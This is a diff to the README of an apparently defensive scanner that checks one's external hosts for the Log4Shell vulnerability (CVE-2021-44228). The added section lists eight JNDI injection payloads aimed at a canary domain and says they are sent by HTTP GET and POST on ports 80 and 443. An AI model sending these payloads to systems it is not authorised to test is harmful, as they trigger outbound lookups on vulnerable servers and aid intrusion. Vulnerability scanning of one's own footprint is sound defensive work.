@@ -2,10 +2,23 @@
 Test for the log4j vulnerability ( CVE-2021-44228 ) across your external footprint
 
 ## Example Use
-
 ```
 ./log4j_CVE-2021-44228_tester.sh <INPUT_FILE> <CANARY_DOMAIN>
 ```
+## Payloads
+```
+Payloads:
+${jndi:ldap://<canary_domain>/a}
+${jndi:ldaps://<canary_domain>/a}
+${jndi:rmi://<canary_domain>/a}
+${jndi:dns://<canary_domain>/a}
+${jndi:corba://<canary_domain>/a}
+${jndi:iiop://<canary_domain>/a}
+${jndi:nis://<canary_domain>/a}
+${jndi:nds://<canary_domain>/a}
+```
+## Methods
+HTTP GET and HTTP POST are called on TCP 80/443 for each ip/domain provided in the input file
 
 ## Requirements
 You will need:
@@ -38,5 +51,7 @@ Use the script to test locally:
 echo "localhost:555" > ips.txt
 ./log4j_CVE-2021-44228_tester.sh ips.txt <canary_domain>
 ```
+
+
 
 
